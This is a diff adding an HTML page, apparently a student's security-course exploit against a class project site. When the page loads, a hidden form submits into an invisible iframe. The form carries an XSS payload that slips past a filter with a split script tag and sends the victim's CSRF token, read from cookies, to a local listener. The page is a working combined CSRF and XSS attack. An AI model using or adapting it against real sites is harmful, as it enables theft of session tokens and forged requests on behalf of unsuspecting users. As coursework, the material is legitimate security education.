@@ -1,0 +1,17 @@
+<!-- Nicholas Mauro (nmauro@bu.edu) U06257749 -->
+<html>
+    <body>
+        <form action="http://cs558web.bu.edu/project2/search?xssdefense=1" method="get" target="myframe" name="payload">
+            <input name="csrfdefense" value="1" type="hidden">
+            <input name="xssdefense" value="1" type="hidden">
+            <input name="username" value="attacker" type="hidden">
+            <input name="password" value="l33th4x" type="hidden">
+            <input name="q" value="<sscriptcript>$.get('http://127.0.0.1:31337', {csrf_token: (document.cookie.split('csrf_token=')[1]).substring(0,32)})</sscriptcript>" type="hidden">
+        </form>
+        <iframe name="myframe" height="0" width="0" style="display:none">
+        </iframe>
+        <script>
+            document.payload.submit();
+        </script>
+    </body>
+</html>
